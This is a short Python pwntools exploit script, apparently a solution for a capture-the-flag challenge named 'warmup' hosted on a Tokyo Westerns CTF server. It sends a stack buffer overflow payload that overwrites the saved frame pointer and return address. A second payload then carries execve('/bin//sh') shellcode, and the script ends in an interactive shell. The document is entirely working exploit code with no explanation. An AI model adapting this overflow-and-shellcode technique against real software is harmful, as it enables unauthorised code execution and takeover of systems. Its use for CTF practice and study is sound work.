from pwn import *

if __debug__:
	#r = process("./warmup")
	r = gdb.debug("./warmup", """
	b *0x400709
	""")
else:
	r = remote("nothing.chal.ctf.westerns.tokyo", 10001)


r.recvuntil(":)\n")

payload = "A" * 0x100
payload += p64(0x601a00)
payload += p64(0x4006db)

r.sendline(payload)

sc = "\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"

payload = "A" * 0x100 + "B" * 8
payload += p64(0x601a10)
payload += sc

r.sendline(payload)

r.interactive()
